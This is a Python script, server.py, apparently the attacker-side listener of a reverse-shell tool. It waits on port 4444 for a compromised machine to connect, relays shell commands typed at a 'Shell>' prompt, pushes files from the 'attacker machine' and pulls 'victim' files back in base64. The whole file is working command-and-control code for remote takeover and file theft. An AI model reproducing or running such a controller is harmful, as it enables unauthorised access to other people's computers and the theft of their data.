# server.py
import socket
import json
import base64

LISTEN_IP = "192.168.251.175"
LISTEN_PORT = 4444

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())

def reliable_receive():
    data = b""
    while True:
        try:
            data += target.recv(1024)
            return json.loads(data.decode())
        except json.JSONDecodeError:
            continue

def write_file(path, content):
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
        return f"[+] File saved as: {path}"
    except Exception as e:
        return f"[-] Error saving file: {str(e)}"

def read_file(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except FileNotFoundError:
        return "[-] File not found."

def server():
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LISTEN_IP, LISTEN_PORT))
    s.listen(1)
    print(f"[+] Listening for incoming connections on port {LISTEN_PORT}...")
    target, ip = s.accept()
    print(f"[+] Connection established from {ip}")
    shell()

def shell():
    while True:
        command = input("Shell> ").strip()
        if not command:
            continue

        reliable_send(command)

        if command == "exit":
            break

        elif command.startswith("upload "):
            local_path = input("Enter path to file on your (attacker) machine: ").strip()
            try:
                content = read_file(local_path)
                reliable_send({
                    "status": "success",
                    "filename": local_path.split("/")[-1],
                    "data": content
                })
                print("[+] Upload sent.")
            except:
                reliable_send({"status": "error", "data": None})
                print("[-] Failed to read local file.")

        elif command.startswith("download "):
            response = reliable_receive()
            if response.get("status") == "success":
                remote_filename = response.get("filename")
                data = response.get("data")
                save_path = input(f"Save victim file '{remote_filename}' to (default: {remote_filename}): ").strip()
                if not save_path:
                    save_path = remote_filename
                result = write_file(save_path, data)
                print(result)
            else:
                print(response.get("message", "[-] Download failed."))

        else:
            result = reliable_receive()
            print(result)

server()
